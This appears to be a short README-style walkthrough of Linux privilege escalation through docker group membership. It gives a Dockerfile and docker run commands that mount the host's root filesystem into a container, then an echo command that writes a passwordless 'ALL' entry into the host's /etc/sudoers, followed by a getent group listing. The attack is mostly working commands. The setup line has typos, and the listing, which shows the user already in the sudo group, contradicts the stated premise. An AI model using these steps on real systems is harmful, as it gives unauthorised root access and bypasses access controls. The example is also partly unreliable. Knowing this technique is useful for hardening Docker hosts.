Assume that we have user that has not got any permissions in "etc/sudoers" file,
but suddenly have access for docker group ```(set-up: sudo usermod -aG <user> <group> ex. sudo suermod -aG BillyGLW docker).```

# Escalation

mkdir pesc
cd pesc
nano Dockerfile
```
FROM debian:wheezy

ENV WORKDIR /pesc

RUN mkdir -p $WORKDIR

VOLUME [ $WORKDIR ]

WORKDIR $WORKDIR
```
docker build -t pesc . 
docker run -v /:/pesc pesc  # put root a file system into workdir, env variable of image with the same name
docker run -v /:/pesc -it pesc /bin/bash

since docker is running with root privilege inside entire file system, originally
hold by my machine, so we can go ahead and work with (etc/sudoers) on original rarget.
because we can edit this, sadly we dont have vim or any editor on docker container, we can actually echo into it
```
echo "<user> ALL=(ALL) NOPASSWD: ALL" >> /pesc/etc/sudoers
```

now in fact we are treated as a root.

# set-up enviroment

### sudo usermod -aG <user> <group> ex. sudo suermod -aG BillyGLW docker

### getent group log:

```
$ getent group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,BillyGLW
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:BillyGLW
floppy:x:25:
tape:x:26:
sudo:x:27:BillyGLW
audio:x:29:
dip:x:30:BillyGLW
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:BillyGLW
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
lxd:x:108:BillyGLW
mlocate:x:109:
uuidd:x:110:
ssh:x:111:
landscape:x:112:
BillyGLW:x:1000:
netdev:x:113:
rdma:x:114:
sambashare:x:115:BillyGLW
BillyGLW:x:1001:
docker:x:116:BillyGLW
```
